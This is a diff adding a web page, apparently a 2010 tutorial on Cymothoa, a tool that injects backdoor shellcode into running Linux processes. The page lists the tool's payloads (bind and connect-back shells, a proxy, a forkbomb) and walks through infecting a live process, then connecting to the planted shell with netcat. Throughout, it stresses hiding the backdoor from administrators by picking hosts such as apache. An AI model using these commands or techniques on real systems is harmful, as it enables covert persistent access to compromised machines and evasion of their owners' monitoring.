@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+  
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Introduction to Cymothoa</title>
+    <link href="css/main.css" rel="stylesheet" type="text/css">
+  </head>
+
+  <body>
+    <article id="main">
+      <h1>Introduction to Cymothoa</h1>
+      <h2>01 May 2010</h2>
+      <br>
+      <p><b>NOTE:</b> This the English translation of an article
+        previously appeared in Italian. For the original version click
+        here.</p>
+      <p>Originally written as a small tutorial, for the release of <b>cymothoa</b>
+	<i>alpha</i>, I've updated the English version adding some
+        extra explanations, taken from the comments of the original
+        article. <br>
+      </p>
+      <p>I have also written an article an Phrack describing more advanced techniques.
+         you can find it <a href="docs/phrack68/p68_0x09_Single Process Parasite_by_Crossbower.txt">here</a>.</p>
+      <hr size="2" width="100%">
+      <p>A first alpha version of <b>cymothoa</b> has just been
+        released by <i>codwizard</i> and me
+        (<a href="http://cymothoa.sourceforge.net/">http://cymothoa.sourceforge.net/</a>).</p>
+      <p>Cymothoa is a tool used to create hidden backdoors on a
+        computer system. To do so, it injects the machine code of the
+        backdoor in the memory space of an already executing process of
+        the machine.</p>
+      <p>The technique is nothing new <em>per se</em>, but we tried to package
+        it in a tool having a convenient interface.</p>
+      <p>Using this technique, there is no need to create a new process
+        in the system (and thus exposing the backdoor to an easy
+        detection by using common tools): the backdoor can live in symbiosis (or
+        better, as a parasite) with an hosting process, so that commands like
+        <i>ps aux</i> can not detect it.</p>
+      <p>For particular kind of backdoors, however, a separate process
+        is highly desirable, for example to implement a client-server
+        backdoor able to serve multiple clients at the same time.
+        This can be addressed forking or cloning the host process, or
+        using more subtle ways (see: <a
+          href="docs/phrack68/p68_0x09_Single Process Parasite_by_Crossbower.txt">single
+          process parasite</a>.) But even these kind of infections are not so
+        easy to spot, since the forked process still inherit the
+        name and the memory content of the original infected process.</p>
+      <p>Consider, for example, a common configuration of the apache web
+        server: a single parent process receives HTTP requests from
+        clients, then fork a child (or reuse a pre-forked child) to
+        handle the request. The system administrator will always see,
+        when running <i>ps</i>, a number of active apache processes.
+        It is very unlikely that an extra "apache" process,
+        containing the backdoor, will arise suspect.</p>
+      <strong>How to use it</strong>
+      <p>The first thing to keep in mind using cymothoa, is that it is a
+        post-exploitation tool, not an exploit. To infect a process we
+        must either be <i>root</i> on the machine, or have at least
+        enough privileges to send arbitrary signals to the target
+        process.</p>
+      <p>We begin listing all the processes running on the machine, to
+        find a suitable process to infect: <br>
+      </p>
+      <pre class="code-snippet">root@bt:~# ps -A | tail<br> 4915 ? 00:00:00 krandrtray<br> 4928 ? 00:00:00 knotify<br> 4967 ? 00:00:01 konqueror<br> 6674 ? 00:00:00 konsole<br> 6675 pts/1 00:00:00 bash<br> 6684 pts/1 00:00:00 cat<br> 6685 ? 00:00:00 konsole<br> 6686 pts/2 00:00:00 bash<br> 6696 pts/2 00:00:00 ps<br> 6697 pts/2 00:00:00 tail<br></pre>
+      <p>To illustrate how to use the tool, we will target a <i>cat</i>
+        process, with pid 6684, running in another terminal window. In
+        this way we can check if the hosting process continues to run
+        correctly after the infection.</p>
+      <p>In a real situation a server process or a daemon (like apache,
+        as discussed before) is a much better choice. The steps are
+        exactly the same.<br>
+      </p>
+      <p>We can now choose the parasite to use, listing those available
+        in our cymothoa binary:</p>
+      <pre class="code-snippet">root@bt:~# ./cymothoa -S<br>0 - bind /bin/sh to the provided port (requires -y)<br>1 - bind /bin/sh + fork() to the provided port (requires -y) - izik &lt;izik@tty64.org&gt;<br>2 - bind /bin/sh to tcp port with password authentication (requires -y -o)<br>3 - /bin/sh connect back (requires -x, -y)<br>4 - tcp socket proxy (requires -x -y -r) - Russell Sanford (xort@tty64.org)<br>5 - script execution (see the payload), creates a tmp file you must remove<br>6 - forks an HTTP Server on port tcp/8800 - http://xenomuta.tuxfamily.org/<br>7 - serial port busybox binding - phar@stonedcoder.org mdavis@ioactive.com<br>8 - forkbomb (just for fun...) - Kris Katterjohn<br>9 - open cd-rom loop (follows /dev/cdrom symlink) - izik@tty64.org<br>10 - audio (knock knock knock) via /dev/dsp - Cody Tubbs (pigspigs@yahoo.com)<br>11 - POC alarm() scheduled shellcode<br>12 - POC setitimer() scheduled shellcode<br>13 - alarm() backdoor (requires -j -y) bind port, fork on accept<br>14 - setitimer() tail follow (requires -k -x -y) send data via upd<br></pre>
+      <p>We will create a classic backdoor using the second shellcode,
+        which bind a shell on a TCP port, and spawn the backdoor as a
+        separate process. We can also personalize the shellcode
+        specifying the port to listen on.</p>
+      <p>To infect the victim we specify the target pid, the shellcode
+        index, and the backdoor TCP port:</p>
+      <pre class="code-snippet">root@bt:~# ./cymothoa -p 6684 -s 1 -y 5555<br><br>[+] attaching to process 6684<br><br>register info:<br><br>eax value: 0xfffffe00 ebx value: 0×0<br>esp value: 0xbfed7208 eip value: 0xffffe424<br><br><br>[+] new esp: 0xbfed7204<br>[+] injecting code into 0xb7f4d000<br>[+] copy general purpose registers<br>[+] detaching from 6684<br><br>[+] infected!!!<br></pre>
+      <p>Good, the tool tells us the host process as been correctly
+        infected. Now, if we run <i>ps</i> again, we should see a new <i>cat</i>
+        process, running our backdoor:<br>
+      </p>
+      <pre class="code-snippet">root@bt:~# ps -A | tail<br> 6674 ? 00:00:00 konsole<br> 6675 pts/1 00:00:00 bash<br> 6684 pts/1 00:00:00 cat &lt;-- original process<br> 6717 pts/1 00:00:00 cat &lt;-- backdoor<br> 6718 pts/2 00:00:00 ps<br> 6719 pts/2 00:00:00 tail<br></pre>
+      <p>If we return to the console where we launched the original <i>cat</i>
+        process, we can see that its behaviour has not changed and that
+        it continues to print back to us the text we type in its standard input.</p>
+      <p>Last thing to do is connecting to the backdoor with <i>netcat</i>:<br>
+      </p>
+      <pre class="code-snippet">root@bt:~# nc -vv localhost 5555<br>localhost [127.0.0.1] 5555 (?) open<br>uname -a<br>Linux bt 2.6.30.9 #1 SMP Tue Dec 1 21:51:08 EST 2009 i686 GNU/Linux<br></pre>
+      <p>We are in...</p>
+      <p><b>Further ideas</b><br>
+      </p>
+      <p>This tool was initially developed as a simple proof of concept
+        for some ideas we had in mind at the time (in particular to implement a <a
+          href="docs/phrack68/p68_0x09_Single Process Parasite_by_Crossbower.txt">single
+          process parasite</a>.)</p>
+      <p>So it is easy to add new backdoors: you can add your
+        personalized shellcodes, or embed shellcodes available on the
+        net (from sites like <a href="http://packetstormsecurity.com/">packetstormsecurity</a>
+        or <a href="http://www.exploit-db.com/">exploit-db</a>) simply
+        editing a source file and recompiling the tool (we wish to keep
+        it a stand-alone binary for obvious purposes).</p>
+      <p>The next thing planned is the port cymothoa to 64bit Linux
+        systems, since it now runs only on 32bit machine. Let me know if
+        you are interested in the port, <span id="result_box"
+          class="short_text" lang="en"><span class="hps">otherwise</span>
+          <span class="hps">my laziness</span> <span class="hps">would</span>
+          <span class="hps">take over in the process</span></span>...<br>
+      </p>
+    </article>
+  </body>
+</html>
